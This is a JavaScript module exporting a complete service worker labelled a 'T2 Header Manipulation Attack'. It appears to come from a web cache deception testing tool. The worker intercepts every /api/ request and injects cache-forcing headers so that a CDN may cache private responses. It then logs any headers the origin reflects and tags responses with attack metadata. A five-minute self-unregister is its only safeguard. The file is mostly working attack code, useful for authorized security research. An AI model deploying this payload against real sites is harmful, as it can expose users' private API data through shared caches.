// T2: Header Manipulation Attack - Complete implementation  
const T2_HEADER_MANIPULATION = `
// Service Worker: T2 Header Manipulation Attack
// Targets: All /api/ endpoints
// Technique: Request header injection for origin reflection

const ATTACK_CONFIG = {
  targetPattern: /^\\/api\\//,
  injectHeaders: {
    'X-Custom-Surrogate-Control': 'max-age=3600',
    'X-Force-CDN-Cache': 'true',
    'X-Cache-Override': 'public'
  }
};

console.log('[SW-WCD-T2] Header Manipulation activated');

self.addEventListener('install', (event) => {
  console.log('[SW-WCD-T2] Installing');
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', (event) => {
  console.log('[SW-WCD-T2] Activating and claiming clients');
  event.waitUntil(clients.claim());
});

self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  
  if (ATTACK_CONFIG.targetPattern.test(url.pathname)) {
    console.log('[SW-WCD-T2] Intercepting API request:', url.pathname);
    
    // Create new headers with injected values
    const modifiedHeaders = new Headers(event.request.headers);
    
    Object.entries(ATTACK_CONFIG.injectHeaders).forEach(([key, value]) => {
      modifiedHeaders.set(key, value);
      console.log(\`[SW-WCD-T2] Injected header: \${key}: \${value}\`);
    });
    
    const modifiedRequest = new Request(event.request, {
      headers: modifiedHeaders
    });
    
    event.respondWith(
      fetch(modifiedRequest)
        .then(response => {
          // Check if origin reflected any headers
          const reflectedHeaders = {};
          Object.keys(ATTACK_CONFIG.injectHeaders).forEach(header => {
            if (response.headers.has(header)) {
              reflectedHeaders[header] = response.headers.get(header);
            }
          });
          
          if (Object.keys(reflectedHeaders).length > 0) {
            console.log('[SW-WCD-T2] Origin reflected headers:', reflectedHeaders);
          }
          
          // Add attack metadata
          const attackHeaders = new Headers(response.headers);
          attackHeaders.set('X-SW-WCD-Attack', 'T2-Header-Manipulation');
          attackHeaders.set('X-SW-WCD-Reflected-Headers', JSON.stringify(reflectedHeaders));
          
          return new Response(response.body, {
            status: response.status,
            statusText: response.statusText,
            headers: attackHeaders
          });
        })
        .catch(error => {
          console.error('[SW-WCD-T2] Attack failed:', error);
          return fetch(event.request);
        })
    );
  }
});

// Safety: Auto-unregister after 5 minutes
setTimeout(() => {
  self.registration.unregister().then(success => {
    console.log('[SW-WCD-T2] Safety auto-unregister:', success);
  });
}, 300000);
`;

export { T2_HEADER_MANIPULATION };